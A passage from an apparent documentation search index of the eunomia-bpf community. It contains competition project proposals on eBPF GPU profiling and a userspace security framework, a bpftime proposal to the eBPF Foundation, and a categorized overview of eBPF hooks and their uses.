\u5f00\u53d1\u4eba\u5458\u8bc6\u522b\u74f6\u9888\u5e76\u8fdb\u884c\u6548\u80fd\u4f18\u5316\u3002</li> <li>\u5982\u679c\u53ef\u4ee5\u7684\u8bdd\uff0c\u63d0\u4f9b\u53ef\u89c6\u5316\u7684\u5206\u6790\u7ed3\u679c\u548c\u62a5\u544a\u3002</li> </ul>"},{"location":"others/miscellaneous/ebpf-gpu/#_3","title":"\u7279\u5f81","text":"<p>\u9879\u76ee\u7684\u7279\u5f81\u5305\u62ec\uff1a</p> <ul> <li>\u80fd\u591f\u5b8c\u6574\u5730\u3001\u4ee5\u8f83\u4f4e\u7684\u5f00\u9500\u8ffd\u8e2a AI/ML \u5de5\u4f5c\u8d1f\u8f7d\uff0c\u5305\u62ec CPU \u548c GPU \u76f8\u5173\u7684\u6027\u80fd\u6570\u636e\u3002</li> <li>\u53ef\u4ee5\u5bf9\u8ffd\u8e2a\u7ed3\u679c\u8fdb\u884c\u6df1\u5ea6\u5206\u6790\uff0c\u5e2e\u52a9\u6027\u80fd\u5de5\u7a0b\u5e08\u5feb\u901f\u5b9a\u4f4d\u6027\u80fd\u74f6\u9888\u5e76\u8fdb\u884c\u6548\u80fd\u4f18\u5316\u3002</li> <li>\u652f\u6301\u5b9e\u65f6\u8ffd\u8e2a\u548c\u79bb\u7ebf\u5206\u6790\uff0c\u6ee1\u8db3\u4e0d\u540c\u573a\u666f\u7684\u9700\u6c42\u3002</li> <li>\u4f7f\u7528\u5185\u6838\u6001\u6216\u7528\u6237\u6001\u7684 eBPF \u8fd0\u884c\u65f6\uff0c\u63a5\u5165\u591a\u79cd\u5206\u6790\u6846\u67b6\uff0c\u5982 Kineto, PyTorch Profiler \u548c Strobelight\uff0c\u4ee5\u53ca\u57fa\u4e8e eBPF \u7684\u6280\u672f\uff0c\u642d\u5efa\u53ef\u7f16\u7a0b\u7684\u6027\u80fd\u5206\u6790\u5e73\u53f0\uff0c\u5b9e\u73b0\u7aef\u5230\u7aef\u7684\u6027\u80fd\u5256\u6790\u3002</li> </ul>"},{"location":"others/miscellaneous/ebpf-gpu/#_4","title":"\u5df2\u6709\u53c2\u8003\u8d44\u6599","text":"<ul> <li>GPU Profiling with BPF at Meta - Riham Selim</li> <li>SYSTEM@SCALE: AI OBSERVABILITY</li> <li>eBPF \u2014 a new Swiss army knife in the system</li> <li>bpftime</li> </ul>"},{"location":"others/miscellaneous/ebpf-gpu/#_5","title":"\u8d5b\u9898\u5206\u7c7b","text":"<p>\u3010code:405\u30112.4.5 \u7cfb\u7edf\u8c03\u8bd5/\u652f\u6491\u5e93\u7684\u8bbe\u8ba1</p>"},{"location":"others/miscellaneous/ebpf-gpu/#_6","title":"\u53c2\u8d5b\u8981\u6c42","text":"<ul> <li>\u4ee5\u5c0f\u7ec4\u4e3a\u5355\u4f4d\u53c2\u8d5b\uff0c\u6700\u591a\u4e09\u4eba\u4e00\u4e2a\u5c0f\u7ec4\uff0c\u4e14\u5c0f\u7ec4\u6210\u5458\u662f\u6765\u81ea\u540c\u4e00\u6240\u9ad8\u6821\u7684\u672c\u79d1\u751f\u6216\u7814\u7a76\u751f</li> <li>\u5141\u8bb8\u5b66\u751f\u53c2\u52a0\u5927\u8d5b\u7684\u591a\u4e2a\u4e0d\u540c\u9898\u76ee\uff0c\u6700\u7ec8\u81ea\u5df1\u9009\u62e9\u4e00\u4e2a\u9898\u76ee\u53c2\u4e0e\u8bc4\u5956</li> <li>\u8bf7\u9075\u5faa\u201c2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u201d\u7684\u7ae0\u7a0b\u548c\u6280\u672f\u65b9\u6848\u8981\u6c42</li> </ul>"},{"location":"others/miscellaneous/ebpf-gpu/#_7","title":"\u96be\u5ea6","text":"<p>\u9ad8\u7b49</p>"},{"location":"others/miscellaneous/ebpf-gpu/#license","title":"License","text":"<p>GPL-3.0 License</p>"},{"location":"others/miscellaneous/ebpf-gpu/#_8","title":"\u6240\u5c5e\u8d5b\u9053","text":"<p>2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u7684\u201cOS\u529f\u80fd\u6311\u6218\u201d\u8d5b\u9053</p>"},{"location":"others/miscellaneous/ebpf-gpu/#_9","title":"\u9879\u76ee\u5bfc\u5e08","text":"<ul> <li>\u59d3\u540d\uff1a\u90d1\u6631\u7b19</li> <li>\u5355\u4f4d\uff1aeunomia-bpf \u5f00\u6e90\u793e\u533a</li> <li>github ID\uff1ahttps://github.com/yunwei37</li> <li>email\uff1ateam@eunomia.dev and yunwei356@gmail.com</li> </ul> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/ebpf-linux/","title":"Project Proposal for bpftime - eBPF Foundation","text":""},{"location":"others/miscellaneous/ebpf-linux/#general-information","title":"General Information","text":"<p>1.1. Name of Project</p> <p>bpftime</p> <p>1.2. Project Description (what it does, why it is valuable, origin and history)</p> <p>bpftime is an userspace eBPF runtime that allows existing eBPF applications to operate in unprivileged userspace using the same libraries and toolchains. It offers Uprobe and Syscall tracepoints for eBPF, with significant performance improvements over kernel uprobe and without requiring manual code instrumentation or process restarts. The runtime facilitates interprocess eBPF maps in userspace shared memory, and is also compatible with kernel eBPF maps, allowing for seamless operation with the kernel's eBPF infrastructure. It includes a high-performance LLVM JIT for various architectures, alongside a lightweight JIT for x86 and an interpreter.</p> <p>The project was started in 2023 by Yusheng Zheng and Tong Yu, as interns sponsored by PLCT lab, ISCAS. It's hosted and maintained by the eunomia-bpf community.</p> <p>1.3. How does this project align with the Foundation's Mission Statement to encourage/foster the deployment and use of eBPF in the industry (e.g., not merely allow using eBPF as an option)</p> <ol> <li>Enable eBPF tools like bcc and bpftrace, or more complex commercial eBPF observability agents, to run in userspace on more platforms, on lower version kernels, in non-privileged container environments, or potentially in other platforms like MacOS, Windows, FreeBSD, etc, without any modification to the eBPF applications.</li> <li>Have better performance in some cases, for example, the uprobes and LLVM JIT/AOT.</li> <li>Enable more usecases and innovations, for example, use <code>bpf_override_return</code> for userspace functions, use XDP in DPDK applications, etc.</li> </ol> <p>For more details, please refer to:</p> <ol> <li>Our blog: https://eunomia.dev/blogs/bpftime/</li> <li>Our talk at Linux Plumbers 2023: https://lpc.events/event/17/contributions/1639/</li> <li>arxiv: https://arxiv.org/abs/2311.07923</li> </ol> <p>1.4. Project website URL</p> <p>https://eunomia.dev/bpftime/</p> <p>1.5. Social media accounts, if any</p> <p>A Discord server: https://discord.gg/jvM73AFdB8</p>"},{"location":"others/miscellaneous/ebpf-linux/#legal-information","title":"Legal Information","text":"<p>2.1. Project Logo URL or attachment (Vector Graphic: SVG, EPS), if any.</p> <p>No logo for bpftime yet.</p> <p>2.2. Project license.  We recommend an OSI-approved license, so if the license is not one on the list, explain why.</p> <p>MIT License</p> <p>2.3. Existing financial sponsorship, if any.</p> <p>The PLCT lab, ISCAS, has some open Internships positions for the project. Some professors from universities also provide some one time sponsorship for the project.</p> <p>See https://github.com/eunomia-bpf/bpftime#acknowledgement for more details.</p> <p>2.4. Was the project previously accepted by any other consortium or foundation?      If so, does the project now accept the eBPF Foundation as its primary support      body?</p> <p>This project has not been accepted by any other consortium or foundation. We are open to accepting the eBPF Foundation as our primary support body.</p> <p>2.5. Trademark status, if any.</p> <p>2.6. Proposed Technical Charter, based on the [template]. Include doc as attachment or give URL of doc.  It is ok to change the text (e.g., \"Technical Steering Committee\") to match the actual structure of the project; projects are free to use whatever governance structure they want.</p>"},{"location":"others/miscellaneous/ebpf-linux/#technical-information","title":"Technical Information","text":"<p>3.1. High level assessment of project synergy with any existing projects under the eBPF Foundation, including how the project compliments/overlaps with existing projects, and potential ways to harmonize over time. Responses may be included both inline and/or in accompanying documentation.</p> <p>3.2. Project Code of Conduct URL.  We recommend one based on the Contributor Covenant v2.0 or the LF Projects Code of Conduct.</p> <p>3.3. Source control URL</p> <p>https://github.com/eunomia-bpf/bpftime</p> <p>3.4. Issue tracker URL</p> <p>https://github.com/eunomia-bpf/bpftime/issues</p> <p>3.5. External dependencies (including licenses, and indicate whether each is a build time or runtime dependency)</p> <ul> <li>boost (Boost Software License) - runtime time</li> <li>https://github.com/gabime/spdlog (MIT) - runtime time</li> <li>https://github.com/nlohmann/json (MIT) - runtime time</li> <li>https://github.com/p-ranav/argparse (MIT) - runtime time</li> <li>bpftool (GPL-2.0-only OR BSD-2-Clauss) - optional, build time</li> <li>libbpf (LGPL-2.1 OR BSD-2-Clause) - optional, runtime time</li> <li>https://github.com/vbpf/ebpf-verifier (MIT) - optional, runtime time</li> <li>https://github.com/iovisor/ubpf (Apache 2.0) - optional, runtime time</li> <li>LLVM (Apache 2.0) - optional, runtime time</li> </ul> <p>3.6. Standards implemented by the project, if any. Include links to any such standards.</p> <p>https://www.kernel.org/doc/html/next/bpf/instruction-set.html - eBPF instruction set</p> <p>Which is tested by the bpf_conformance</p> <p>3.7. Release methodology and mechanics</p> <p>3.8. List of project's official communication channels (slack, irc, mailing lists)</p> <ul> <li>Discord: https://discord.gg/jvM73AFdB8</li> <li>Mailing list: team@eunomia.dev</li> </ul> <p>3.9. Project Security Response Policy for handling any vulnerabilities reported</p> <p>3.10. Expected budget request.  See [Project Benefits] for items that may be requested for potential support.</p> <p>3.11. Any additional information the BSC and Board should take into consideration when reviewing your proposal.</p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/ebpf-lsm-usm/","title":"\u5b9e\u73b0\u5185\u6838\u4e0e\u7528\u6237\u6001\u5171\u540c\u5de5\u4f5c\u7684 eBPF \u5b89\u5168\u6846\u67b6 - \u64cd\u4f5c\u7cfb\u7edf\u5927\u8d5b\u8d5b\u9898","text":""},{"location":"others/miscellaneous/ebpf-lsm-usm/#_1","title":"\u9879\u76ee\u63cf\u8ff0","text":"<p>bpftime \u662f\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684 eBPF \u8fd0\u884c\u65f6\uff0c\u53ef\u8ba9\u73b0\u6709\u7684 eBPF \u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u5728\u975e\u7279\u6743\u7528\u6237\u7a7a\u95f4\u4e2d\u8fd0\u884c\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u5e93\u548c\u5de5\u5177\u94fe\uff0c\u5e76\u4e14\u83b7\u53d6\u5230\u8ffd\u8e2a\u5206\u6790\u7684\u7ed3\u679c\u3002\u5b83\u4e3a eBPF \u63d0\u4f9b Uprobe \u548c Syscall tracepoint \u7b49\u8ffd\u8e2a\u70b9\uff0c\u6bd4\u5185\u6838 uprobe \u7684\u5f00\u9500\u964d\u4f4e\u7ea610\u500d\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u7684\u4ee3\u7801\u63d2\u6869\u6216\u8fdb\u7a0b\u91cd\u542f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u4e8e\u6e90\u4ee3\u7801\u548c\u7f16\u8bd1\u6d41\u7a0b\u7684\u65e0\u4fb5\u5165\u5f0f\u5206\u6790\u3002\u5b83\u4e5f\u53ef\u4ee5\u548c DPDK \u7b49\u7ed3\u5408\uff0c\u5728\u7528\u6237\u6001\u7f51\u7edc\u4e2d\u5b9e\u73b0 XDP \u7684\u529f\u80fd\uff0c\u5e76\u548c\u5185\u6838 XDP \u517c\u5bb9\u3002\u8fd0\u884c\u65f6\u5728\u7528\u6237\u7a7a\u95f4\u5171\u4eab\u5185\u5b58\u4e2d\u652f\u6301\u8fdb\u7a0b\u95f4\u7684 eBPF maps\uff0c\u4e5f\u517c\u5bb9\u5185\u6838\u7684 eBPF maps\uff0c\u53ef\u4ee5\u4e0e\u5185\u6838\u7684 eBPF \u57fa\u7840\u8bbe\u65bd\u65e0\u7f1d\u64cd\u4f5c\u3002\u5b83\u8fd8\u5305\u542b\u591a\u79cd\u67b6\u6784\u7684\u9ad8\u6027\u80fd eBPF LLVM JIT/AOT \u7f16\u8bd1\u5668\u3002</p> <p>LSM (Linux Security Modules) \u662f\u4e00\u79cd\u5728Linux\u5185\u6838\u4e2d\u5b9e\u73b0\u7684\u5b89\u5168\u6846\u67b6\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u5141\u8bb8\u5404\u79cd\u5b89\u5168\u7b56\u7565\u6a21\u5757\u63d2\u5165\u5230\u5185\u6838\u4e2d\uff0c\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u3002LSM \u65e8\u5728\u4e3aLinux\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e00\u4e2a\u62bd\u8c61\u5c42\uff0c\u4ee5\u652f\u6301\u591a\u79cd\u4e0d\u540c\u7684\u5b89\u5168\u7b56\u7565\uff0c\u800c\u4e0d\u9700\u8981\u6539\u53d8\u5185\u6838\u7684\u6838\u5fc3\u4ee3\u7801\u3002\u8fd9\u79cd\u8bbe\u8ba1\u5141\u8bb8\u7cfb\u7edf\u7ba1\u7406\u5458\u6216\u53d1\u884c\u7248\u9009\u62e9\u9002\u5408\u5176\u5b89\u5168\u9700\u6c42\u7684\u5b89\u5168\u6a21\u578b\uff0c\u5982SELinux\u3001AppArmor\u3001Smack\u7b49\u3002</p> <p>LSM \u53ef\u4ee5\u7528\u6765\u505a\u4ec0\u4e48\uff1f</p> <ol> <li>\u8bbf\u95ee\u63a7\u5236\uff1aLSM \u6700\u5e38\u89c1\u7684\u7528\u9014\u662f\u5b9e\u73b0\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\uff08MAC\uff09\u7b56\u7565\uff0c\u8fd9\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u6240\u6709\u8005\u7684\u8bbf\u95ee\u63a7\u5236\uff08DAC\uff09\u4e0d\u540c\u3002MAC \u53ef\u4ee5\u7ec6\u7c92\u5ea6\u5730\u63a7\u5236\u8fdb\u7a0b\u5bf9\u6587\u4ef6\u3001\u7f51\u7edc\u7aef\u53e3\u3001\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7b49\u8d44\u6e90\u7684\u8bbf\u95ee\u3002</li> <li>\u65e5\u5fd7\u548c\u5ba1\u8ba1\uff1aLSM \u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u548c\u5ba1\u8ba1\u7cfb\u7edf\u4e0a\u7684\u654f\u611f\u64cd\u4f5c\uff0c\u63d0\u4f9b\u8be6\u7ec6\u7684\u65e5\u5fd7\u4fe1\u606f\uff0c\u5e2e\u52a9\u68c0\u6d4b\u548c\u9632\u8303\u6f5c\u5728\u7684\u5b89\u5168\u5a01\u80c1\u3002</li> <li>\u6c99\u7bb1\u548c\u9694\u79bb\uff1a\u901a\u8fc7\u9650\u5236\u7a0b\u5e8f\u7684\u884c\u4e3a\u548c\u5b83\u4eec\u53ef\u4ee5\u8bbf\u95ee\u7684\u8d44\u6e90\uff0cLSM \u53ef\u4ee5\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u7684\u6c99\u7bb1\u5316\uff0c\u4ece\u800c\u51cf\u5c11\u6076\u610f\u8f6f\u4ef6\u6216\u6f0f\u6d1e\u5229\u7528\u7684\u98ce\u9669\u3002</li> <li>\u5f3a\u5316\u5185\u6838\u548c\u7528\u6237\u7a7a\u95f4\u7684\u5b89\u5168\uff1aLSM \u5141\u8bb8\u5b9e\u73b0\u989d\u5916\u7684\u5b89\u5168\u68c0\u67e5\u548c\u9650\u5236\uff0c\u7528\u4e8e\u5f3a\u5316\u5185\u6838\u81ea\u8eab\u7684\u5b89\u5168\uff0c\u4ee5\u53ca\u8fd0\u884c\u5728\u7528\u6237\u7a7a\u95f4\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u3002</li> <li>\u9650\u5236\u7279\u6743\u64cd\u4f5c\uff1aLSM \u53ef\u4ee5\u9650\u5236\u5373\u4f7f\u662f\u62e5\u6709root\u6743\u9650\u7684\u8fdb\u7a0b\u6240\u80fd\u6267\u884c\u7684\u64cd\u4f5c\uff0c\u4ece\u800c\u51cf\u5c11\u7cfb\u7edf\u7ba1\u7406\u5458\u9519\u8bef\u914d\u7f6e\u6216\u8005\u62e5\u6709root\u6743\u9650\u7684\u6076\u610f\u8f6f\u4ef6\u7684\u6f5c\u5728\u5371\u5bb3\u3002</li> </ol> <p>\u501f\u52a9 bpftime\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7528\u6237\u7a7a\u95f4\u8fd0\u884c eBPF \u7a0b\u5e8f\uff0c\u4e0e\u5185\u6838\u517c\u5bb9\uff0c\u5e76\u4e14\u53ef\u4ee5\u548c\u5185\u6838\u7684 eBPF \u534f\u540c\u5de5\u4f5c\u6765\u8fdb\u884c\u9632\u5fa1\u3002\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u5c06 eBPF \u7684\u5b89\u5168\u673a\u5236\u548c\u7279\u6027\u8fdb\u4e00\u6b65\u6269\u5c55\u5230\u7528\u6237\u6001\uff0c\u8ba9\u7528\u6237\u6001\u7684 eBPF \u548c\u5185\u6838\u6001\u7684 eBPF \u534f\u540c\u5de5\u4f5c\uff0c\u6765\u5b9e\u73b0\u66f4\u5f3a\u5927\u3001\u66f4\u7075\u6d3b\u7684\u5b89\u5168\u7b56\u7565\u548c\u9632\u5fa1\u80fd\u529b\u5462\uff1f\u8ba9\u6211\u4eec\u628a\u8fd9\u79cd\u673a\u5236\u53eb\u505a USM\uff08Userspace Security Modules or Union Security Modules\uff09\u3002</p>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_2","title":"\u9884\u671f\u76ee\u6807","text":"<ol> <li>\u6846\u67b6\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff1a\u5728 bpftime \u4e2d\u8bbe\u8ba1\u5e76\u5b9e\u73b0\u4e00\u4e2a\u7075\u6d3b\u7684\u5b89\u5168\u6846\u67b6 USM\uff0c\u8be5\u6846\u67b6\u80fd\u591f\u8ba9\u7528\u6237\u6001\u7684 eBPF USM \u7a0b\u5e8f\u4e0e\u5185\u6838\u6001\u7684 eBPF LSM \u7a0b\u5e8f\u517c\u5bb9\u5e76\u4e14\u534f\u540c\u5de5\u4f5c\u3002\u8fd9\u5305\u62ec\u5b9a\u4e49\u6846\u67b6\u7684\u67b6\u6784\u3001API \u8bbe\u8ba1\u3001\u901a\u4fe1\u673a\u5236\u4ee5\u53ca\u5b89\u5168\u7b56\u7565\u7684\u5b9e\u65bd\u65b9\u6cd5\uff0c\u9884\u671f\u80fd\u63d0\u4f9b\u4e00\u4e2a\u7edf\u4e00\u7684\u5b89\u5168\u9632\u5fa1\u4f53\u7cfb\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u5bf9\u7279\u5b9a\u7cfb\u7edf\u8c03\u7528\u7684\u62e6\u622a\u3001\u52a8\u6001\u8c03\u6574\u5b89\u5168\u7b56\u7565\u7b49\u529f\u80fd\u3002</li> <li>\u5c1d\u8bd5\u63a2\u7d22\u53ef\u80fd\u7684\u5b89\u5168\u573a\u666f\uff0c\u4f7f\u7528\u5bf9\u5e94\u7684\u673a\u5236\u5bf9\u5f53\u524d\u5b58\u5728\u7684\u5b89\u5168\u95ee\u9898\u8fdb\u884c\u62e6\u622a\u548c\u9632\u5fa1\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u5e94\u7528\u5c42\u534f\u8bae\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u901a\u8fc7\u7528\u6237\u6001 eBPF \u8fdb\u884c\u62e6\u622a\u548c\u5206\u6790\u53ef\u80fd\u662f\u66f4\u597d\u7684\u9009\u62e9\uff0c\u800c\u4e0d\u662f\u5728\u5185\u6838\u4e2d\u8fdb\u884c\u5904\u7406\uff1b\u5bf9\u4e8e\u6587\u4ef6\u7b49\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u5185\u6838\u4e2d\u7684 LSM \u53ef\u4ee5\u63d0\u4f9b\u66f4\u597d\u7684\u5b89\u5168\u6027\u3002</li> </ol>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_3","title":"\u7279\u5f81","text":"<p>\u9879\u76ee\u7684\u7279\u5f81\u5305\u62ec\uff1a</p> <ul> <li>\u5f00\u6e90\u4ee3\u7801\u5e76\u4e14\u5c3d\u53ef\u80fd\u548c\u4e0a\u6e38\u793e\u533a\u4e00\u8d77\u5408\u4f5c</li> <li>\u9700\u8981\u5bfb\u627e\u5bf9\u5e94\u7684 CVE \u6f0f\u6d1e\u6216\u8005\u5b89\u5168\u95ee\u9898\uff0c\u8fdb\u884c\u5206\u6790\u3001\u642d\u5efa\u8fd0\u884c\u65f6\u548c\u8bbe\u8ba1\u9632\u5fa1\u7b56\u7565</li> <li>\u9700\u8981\u6709\u5408\u9002\u7684\u65b9\u5f0f\u6765\u6d4b\u8bd5\u548c\u9a8c\u8bc1\u5b89\u5168\u7b56\u7565\u7684\u6709\u6548\u6027</li> </ul>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_4","title":"\u5df2\u6709\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Linux Plumbers 23 \u6f14\u8bb2\uff1abpftime: Fast uprobes with user space BPF runtime</li> <li>bpftime</li> <li>https://docs.kernel.org/bpf/prog_lsm.html</li> <li>https://blog.cloudflare.com/live-patch-security-vulnerabilities-with-ebpf-lsm</li> <li>https://github.com/eunomia-bpf/bpftime/issues/148</li> </ul>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_5","title":"\u8d5b\u9898\u5206\u7c7b","text":"<p>\u3010code:503\u30112.5.3 \u5b89\u5168\u5e94\u7528\uff08\u52a0\u5bc6\u7b49\uff09</p>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_6","title":"\u53c2\u8d5b\u8981\u6c42","text":"<ul> <li>\u4ee5\u5c0f\u7ec4\u4e3a\u5355\u4f4d\u53c2\u8d5b\uff0c\u6700\u591a\u4e09\u4eba\u4e00\u4e2a\u5c0f\u7ec4\uff0c\u4e14\u5c0f\u7ec4\u6210\u5458\u662f\u6765\u81ea\u540c\u4e00\u6240\u9ad8\u6821\u7684\u672c\u79d1\u751f\u6216\u7814\u7a76\u751f</li> <li>\u5141\u8bb8\u5b66\u751f\u53c2\u52a0\u5927\u8d5b\u7684\u591a\u4e2a\u4e0d\u540c\u9898\u76ee\uff0c\u6700\u7ec8\u81ea\u5df1\u9009\u62e9\u4e00\u4e2a\u9898\u76ee\u53c2\u4e0e\u8bc4\u5956</li> <li>\u8bf7\u9075\u5faa\u201c2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u201d\u7684\u7ae0\u7a0b\u548c\u6280\u672f\u65b9\u6848\u8981\u6c42</li> </ul>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_7","title":"\u96be\u5ea6","text":"<p>\u9ad8\u7ea7</p>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#license","title":"License","text":"<p>GPL-3.0 License</p>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_8","title":"\u6240\u5c5e\u8d5b\u9053","text":"<p>2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u7684\u201cOS\u529f\u80fd\u6311\u6218\u201d\u8d5b\u9053</p>"},{"location":"others/miscellaneous/ebpf-lsm-usm/#_9","title":"\u9879\u76ee\u5bfc\u5e08","text":"<ul> <li>\u59d3\u540d\uff1a\u90d1\u6631\u7b19</li> <li>\u5355\u4f4d\uff1aeunomia-bpf \u5f00\u6e90\u793e\u533a</li> <li>github ID\uff1ahttps://github.com/yunwei37</li> <li>email\uff1ateam@eunomia.dev and yunwei356@gmail.com</li> </ul> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/ebpf-usecases/","title":"Categorization of eBPF Hooks and Use Cases","text":""},{"location":"others/miscellaneous/ebpf-usecases/#1-networking","title":"1. Networking","text":"<ul> <li>XDP Hook: XDP allows high-performance network packet processing, such as dropping malicious packets before they reach the network stack for DDoS mitigation.</li> <li>TC Hook: The TC hook enables efficient traffic control by redirecting, filtering, or shaping network traffic directly at the kernel\u2019s Traffic Control layer.</li> <li>socket_filter Hook: This hook allows eBPF programs to filter packets at the socket layer, enabling custom packet filtering and processing for specific applications.<ul> <li>BPF_PROG_TYPE_SOCKET_FILTER</li> </ul> </li> <li>Socket Lookup Hook: This hook allows selecting the target socket for incoming network packets, improving scalability and steering traffic based on the packet\u2019s IP or port.</li> <li>Socket Reuseport Hook: Facilitates efficient load balancing by selecting a socket from a set of reuseport sockets based on NUMA locality or connection state.</li> <li>Cgroup Ingress/Egress Hook: Allows for container-specific traffic control, such as limiting the outgoing bandwidth for a container in Kubernetes environments.</li> <li>ULP Hook (SK_MSG): This hook allows eBPF programs to enforce payload-level policies for sockets, such as managing encrypted traffic with kTLS.</li> <li>TCP Congestion Control Hook: Registers eBPF-based TCP congestion control algorithms, allowing for custom network congestion management in production environments.</li> <li>Socket Operations Hook: eBPF programs can dynamically adjust socket options like TCP timeouts and header options based on peer address and connection state.</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#2-profiling","title":"2. Profiling","text":"<ul> <li>Perf Events Hook: These hooks attach eBPF programs to hardware or software performance counters, enabling continuous profiling of CPU or memory usage in production environments with minimal overhead.</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#3-tracing","title":"3. Tracing","text":"<ul> <li>Tracepoints Hook: Static hooks embedded in the kernel code allow eBPF to trace kernel events like system calls, such as tracing file open operations to monitor access patterns.</li> <li>Kprobes Hook: Dynamic hooks that can trace almost any function within the kernel, useful for monitoring critical operations like function entry and exit in real-time. It could also trace by address.</li> <li>fentry/fexit: These hooks allow tracing of function entry and exit points, enabling detailed performance analysis and debugging of kernel functions.</li> <li>Uprobes Hook: Attaches to user-space application functions, allowing eBPF to trace behaviors like user input in applications, such as monitoring readline function calls in <code>bash</code>.</li> <li>USDT Hook: User-level static tracepoints embedded in applications, enabling eBPF to trace custom events like function calls in user-space applications.</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#4-security","title":"4. Security","text":"<ul> <li>LSM (Linux Security Modules) Hook: eBPF integrates with LSM hooks to dynamically enforce security policies, like applying custom memory access restrictions in real time.</li> <li>Seccomp Hook: Extends seccomp with eBPF filters to restrict system calls based on application behavior, such as dynamically limiting the system calls available to containerized apps. https://lwn.net/Articles/857228/ https://arxiv.org/abs/2302.10366</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#5-storage-and-file","title":"5. Storage and File","text":"<ul> <li>XRP (eXpress Read Path) Hook: eBPF programs attached to the NVMe driver layer bypass the traditional storage stack to accelerate read operations directly, enhancing NVMe performance.</li> <li>eBPF for fuse: eBPF programs can intercept and modify file system operations in FUSE, such as implementing custom file access policies or caching strategies. https://lwn.net/Articles/915717/ https://lpc.events/event/16/contributions/1339/attachments/945/1861/LPC2022%20Fuse-bpf.pdf</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#6-memory","title":"6. Memory","text":"<ul> <li>Memory Management Hook: eBPF can modify memory handling, such as dynamically adjusting the page reclaim policy under high memory pressure to optimize memory usage. https://lpc.events/event/18/contributions/1932/ https://arxiv.org/pdf/2409.11220</li> <li>OOM (Out-of-Memory) Handling Hook: eBPF programs can intercept and handle OOM events, such as prioritizing memory allocation for critical applications or processes. https://lwn.net/Articles/941614/</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#7-scheduling","title":"7. Scheduling","text":"<ul> <li>SCHED-EXT Hook: eBPF allows the full replacement of the kernel\u2019s scheduler, enabling custom scheduling logic such as implementing a user-defined task management strategy. https://lpc.events/event/18/sessions/192/</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#8-device-drivers","title":"8. Device Drivers","text":"<ul> <li>HID-BPF Hook: Enables dynamic modification of HID device drivers via eBPF, allowing custom input event filtering for devices like the Steamdeck. https://docs.kernel.org/hid/hid-bpf.html</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#9-testing","title":"9. Testing","text":"<p>Note some Testing and Runtime features are hooks, some are not.</p> <ul> <li>Fault Injection: eBPF allows simulation of system faults like packet loss or memory errors to test the robustness of applications in adverse conditions, such as introducing artificial packet loss to test network resilience. https://docs.ebpf.io/linux/helper-function/bpf_override_return/</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#10-runtime-features","title":"10. Runtime features","text":"<ul> <li>Freplace: Allows eBPF programs to replace another eBPF program at runtime, enabling dynamic program updates. Used in libxdp to allow more than one program to be attached to the same hook. https://github.com/xdp-project/xdp-tools</li> <li>iterators: Allows eBPF programs to iterate over kernel data structures or eBPF maps. https://docs.kernel.org/bpf/bpf_iterators.html</li> <li>timer: Allows eBPF programs to set timers for delayed execution, such as scheduling periodic tasks or timeouts. https://lwn.net/Articles/862136/</li> </ul>"},{"location":"others/miscellaneous/ebpf-usecases/#the-comparison-of-ebpf-program-types-attach-types-and-event-types","title":"The comparison of eBPF program types, attach types and event types","text":"<p>https://docs.kernel.org/bpf/libbpf/program_types.html</p> <p>It has a table that shows the comparison of eBPF program types, attach types and events defined in the elf, such as <code>cgroup/sendmsg6</code> or <code>perf_event</code></p>"},{"location":"others/miscellaneous/ebpf-usecases/#definitions-of-core-requirements","title":"Definitions of Core Requirements","text":"<ol> <li>Performance: Extensions must operate efficiently to maintain or enhance system performance without introducing significant overhead.</li> <li>Security: Extensions should protect against vulnerabilities and ensure the integrity and confidentiality of the system.</li> <li>Expressiveness: Extensions need the capability to define and implement complex, detailed, and customizable logic or policies.</li> <li>Dynamic: Extensions must be able to adjust to varying conditions, workloads, or requirements in 